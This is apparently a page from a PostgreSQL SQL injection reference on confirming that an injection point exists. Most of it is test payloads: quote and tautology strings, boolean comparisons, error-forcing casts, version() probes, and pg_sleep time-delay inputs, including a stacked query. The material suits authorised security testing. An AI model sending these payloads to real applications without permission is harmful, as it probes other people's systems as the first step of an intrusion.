---
title: Testing Injection
description: Methods to verify if a PostgreSQL injection point exists
category: Basics
order: 4
tags: ["testing", "basics", "detection"]
lastUpdated: 2025-12-07
---

## Testing for Injection

When testing for SQL injection vulnerabilities in PostgreSQL applications, use these techniques to identify injection points.

### Basic Tests

| Test Payload   | Expected Behavior        |
| -------------- | ------------------------ |
| `'`            | Causes SQL syntax error  |
| `''`           | No error (escaped quote) |
| `' OR '1'='1`  | Always true condition    |
| `' OR '1'='2`  | Always false condition   |
| `' AND '1'='1` | True if injection exists |

### Numeric Injection Tests

For numeric parameters:

```sql
-- Original: SELECT * FROM products WHERE id = 1
1 AND 1=1    -- True, should return same result
1 AND 1=2    -- False, should return different/no result
1-false      -- Returns 1 (false = 0)
1-true       -- Returns 0 (true = 1)
```

### String Concatenation Tests

PostgreSQL uses `||` for string concatenation:

```sql
-- Original: SELECT * FROM users WHERE name = 'admin'
adm'||'in    -- Should work if injection exists
```

### Boolean-Based Detection

```sql
' AND 1=1--
' AND 1=2--
```

If the first returns results and the second doesn't, injection likely exists.

### PostgreSQL-Specific Tests

```sql
-- Test for PostgreSQL specifically
' AND 1=CAST(1 AS int)--
' AND version() IS NOT NULL--
' AND current_database() IS NOT NULL--
```

### Error-Based Detection

Force errors to confirm PostgreSQL:

```sql
' AND 1=CAST('a' AS int)--
```

This should produce a PostgreSQL-specific error message indicating the database type.

### Time-Based Detection

```sql
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5)) IS NOT NULL--
```

If the page takes 5 seconds longer to load, injection exists and PostgreSQL is confirmed.

### Notes

- PostgreSQL is case-sensitive for string comparisons by default
- Always test with both single and double quotes
- Check for error messages that reveal PostgreSQL-specific information
